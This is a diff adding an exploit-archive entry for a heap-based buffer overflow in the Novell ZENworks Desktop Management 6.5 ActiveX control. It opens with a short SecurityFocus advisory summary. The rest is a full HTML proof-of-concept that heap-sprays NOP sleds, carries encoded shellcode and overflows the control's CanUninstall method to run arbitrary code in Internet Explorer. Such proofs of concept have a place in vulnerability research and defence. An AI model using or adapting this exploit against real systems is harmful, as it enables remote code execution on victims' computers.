@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/31435/info
+
+Novell ZENworks Desktop Management ActiveX control is prone to a buffer-overflow vulnerability because the application fails to adequately check boundaries on user-supplied input.
+
+An attacker can exploit this issue to execute arbitrary code in the context of the application using the ActiveX control (typically Internet Explorer). Failed attacks will likely cause denial-of-service conditions.
+
+ZENworks Desktop Management 6.5 is vulnerable; other versions may also be affected.
+
+
+< html> < head> < title>Novell ZENWorks for Desktops Version 6.5 Remote (Heap-Based) PoC < /head> < body> < script> var buffa1 = unescape("%uce90%u08bc") do { buffa1 += buffa1; } while (buffa1.length < 0x900000); var buffa2 = unescape("%u9090%u9090") do { buffa2 += buffa2; } while (buffa2.length < 0x1500000); buffa1 += buffa2; buffa1 += unescape("%uC929%uE983%uD9DB%uD9EE%u2474" + "%u5BF4%u7381%uA913%u4A67%u83CC%uFCEB%uF4E2%u8F55" + "%uCC0C%u67A9%u89C1%uEC95%uC936%u66D1%u47A5%u7FE6" + "%u93C1%u6689%u2FA1%u2E87%uF8C1%u6622%uFDA4%uFE69" + "%u48E6%u1369%u0D4D%u6A63%u0E4B%u9342%u9871%u638D" + "%u2F3F%u3822%uCD6E%u0142%uC0C1%uECE2%uD015%u8CA8" + "%uD0C1%u6622%u45A1%u43F5%u0F4E%uA798%u472E%u57E9" + "%u0CCF%u68D1%u8CC1%uECA5%uD03A%uEC04%uC422%u6C40" + "%uCC4A%uECA9%uF80A%u1BAC%uCC4A%uECA9%uF022%u56F6" + "%uACBC%u8CFF%uA447%uBFD7%uBFA8%uFFC1%u46B4%u30A7" + "%u2BB5%u8941%u33B5%u0456%uA02B%u49CA%uB42F%u67CC" + "%uCC4A%uD0FF"); < /script> < object id="victim" classid="clsid:0F517994-A6FA-4F39-BD4B-EC2DF00AEEF1"> < /object> < script language="vbscript"> appName = String(300, "A") + "?????" victim.CanUninstall appName < /script> < /body> < /html> 
